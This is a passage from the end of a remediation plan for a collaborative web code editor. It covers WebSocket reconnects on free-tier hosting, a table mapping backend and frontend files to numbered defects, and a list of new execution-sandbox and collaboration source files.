The free tier spins instances down after inactivity, which drops WebSocket connections. The reconnect logic in Phase 3 makes this recoverable rather than fatal, but long-lived sessions will still see periodic reconnects. Upgrading the instance tier is the only real fix and is a hosting decision, not a code change.

---

## Appendix A — Files Requiring Modification

| File | Defects addressed |
|---|---|
| `editor-backend/src/main/resources/application.properties` | 2.1.1, 2.1.6 |
| `editor-backend/src/main/resources/ca.pem` | 2.1.6 |
| `editor-backend/pom.xml` | 2.4.8, 2.1.7 |
| `editor-backend/Dockerfile` | 2.1.7 |
| `editor-backend/src/main/java/.../websocket/WebSocketHandler.java` | 2.1.1, 2.1.5, 2.2.4, 2.2.5, 2.3.1–2.3.6, 2.4.2, 2.4.3, 2.4.12, 2.4.22 |
| `editor-backend/src/main/java/.../config/WebSocketConfig.java` | 2.1.4, 2.4.4 |
| `editor-backend/src/main/java/.../service/SandboxExecutionService.java` | 2.1.2, 2.1.3, 2.4.5 |
| `editor-backend/src/main/java/.../service/DockerExecutionService.java` | **deleted** — 2.4.7 |
| `editor-backend/src/main/java/.../service/SessionService.java` | 2.4.9, 2.4.21 |
| `editor-backend/src/main/java/.../service/FileService.java` | 2.4.10 |
| `editor-backend/src/main/java/.../controller/SessionController.java` | 2.1.4, 2.4.11, 2.4.13 |
| `editor-backend/src/main/java/.../util/FileUtils.java` | 2.4.17 |
| `editor-backend/src/main/java/.../dockerImages/*/Dockerfile` | 2.4.18 |
| `editor-frontend/src/pages/Editor.jsx` | 2.2.1, 2.2.3, 2.2.6, 2.2.7, 2.2.9, 2.4.1, 2.4.14–2.4.16 |
| `editor-frontend/src/components/CodeEditor.jsx` | 2.2.1, 2.2.2, 2.2.8 |
| `editor-frontend/src/components/FileStructure.jsx` | 2.2.4, 2.4.20, 2.4.25 |
| `editor-frontend/src/components/ConfirmDelete.jsx` | 2.4.24 |
| `editor-frontend/src/pages/Home.jsx` | 2.2.5, 2.4.1, 2.4.20 |
| `editor-frontend/vite.config.js` | 2.4.19 |
| `editor-frontend/package.json` | add `yjs`, `y-monaco`, `y-protocols` |

## Appendix B — New Files

```
backend/  execution/ExecutionStrategy.java
          execution/ContainerExecutionStrategy.java
          execution/FirejailExecutionStrategy.java
          execution/ExecutionRequest.java
          execution/ExecutionResult.java
          execution/ExecutionPathValidator.java
          collab/DocStreamService.java
          collab/AwarenessRelay.java
          collab/DocPersistenceService.java
          collab/RoomRegistry.java
          collab/MessageEnvelope.java
          health/HealthController.java

frontend/ hooks/useCollabSession.js
         components/OutputPanel.jsx
         components/PresenceBar.jsx
```